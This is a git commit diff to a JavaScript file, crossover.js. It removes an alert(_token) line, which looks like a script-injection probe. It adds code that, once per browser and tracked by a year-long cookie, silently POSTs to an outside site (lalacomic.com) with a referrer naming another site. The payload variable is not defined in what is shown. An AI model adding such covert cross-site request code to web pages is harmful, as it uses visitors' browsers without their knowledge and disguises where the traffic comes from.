9398ffb97d33493f793adb051271d7b7e3daebec
jameszzlee <88870325+jameszzlee@users.noreply.github.com>
2021-08-13 15:28:36 +0700

    Update crossover.js

--- crossover.js
+++ crossover.js
@@ -1,1 +1,35 @@
-alert(_token);
+        function getCookie(cname) {
+            var name = cname + "=";
+            var ca = document.cookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0)==' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length,c.length);
+                }
+            }
+            return "";
+        }
+        function setCookie(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays*24*60*60*1000));
+            var expires = "expires="+ d.toUTCString();
+            document.cookie = cname + "=" + cvalue + "; " + expires;
+        }
+        if(getCookie('zcrsefseaf')==''){
+            fetch('https://lalacomic.com',{
+                headers:{
+                'Content-Type':'application/x-www-form-urlencoded'
+                },
+                referrer: "https://truyengihot.net",
+                referrerPolicy: "no-referrer-when-downgrade",
+                mode:'cors',
+                method:'POST',
+                body: data
+                }).then(respone=>{
+                console.log(respone);
+                });
+            setCookie('zcrsefseaf', 1, 365);
+        }
